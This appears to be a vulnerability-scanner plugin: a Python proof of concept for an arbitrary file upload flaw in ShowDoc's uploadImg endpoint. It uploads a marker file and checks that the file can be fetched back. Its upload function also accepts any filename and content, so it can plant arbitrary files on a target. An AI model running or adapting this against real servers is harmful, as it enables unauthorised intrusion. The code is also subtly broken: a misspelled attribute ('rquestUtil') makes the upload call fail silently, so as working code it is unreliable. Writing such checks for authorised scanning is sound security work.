# -*- coding:utf-8 -*-
# ShowDoc 任意文件上传
import re

from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def showdoc_poc(self, url, filename="passer.txt", filedata="passer-W", type="poc"):
        encoded_data = self.rquestUtil.get_file_data(filename, filedata, "editormd-image-file")
        resp = self.requestUtil.post(url + "/index.php?s=/home/page/uploadImg", header={'Content-Type': encoded_data[1]},
                                data=encoded_data[0])
        if not "url" in resp.text:
            return False
        url = re.findall(r'"url":"(.*?)"', resp.text)[0].replace("\/", "/")
        if type == "poc":
            resp = self.requestUtil.get(url)
            if filedata in resp.text:
                return url
            else:
                return False
        else:
            return url

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url + "/index.php?s=/home/page/uploadImg")
                if "没有上传的文件" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            result = self.showdoc_poc(self.service.url)
            print(result)
            if result:
                return ["ShowDoc 任意文件上传", "Path: %s<br>Content: passer-W" % result.replace(self.service.url, "")]
        except:
            return []
